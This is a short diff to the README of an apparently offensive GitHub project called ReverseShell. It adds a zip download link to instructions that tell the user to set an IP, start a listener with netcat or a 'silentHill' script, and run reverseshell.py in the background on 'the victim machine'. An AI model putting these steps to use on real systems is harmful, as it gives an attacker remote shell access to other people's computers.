@@ -14,6 +14,11 @@ After successful cloning:
 ```
 cd ReverseShell
 ```
+
+Or download the zip:
+```
+https://github.com/Keyj33k/ReverseShell/archive/refs/heads/main.zip
+```
 ## You will found a file called >> reverseshell.py:
 
 - Now you need to change the ip in the script.
@@ -24,10 +29,12 @@ cd ReverseShell
 ```
 nc -lnvp 5003
 ```
+
 - or use the silentHill listener:
 ```
 python3 silentHill.py
 ```
+
 - On the vivtim machine:
 ```
 python3 reverseshell.py &
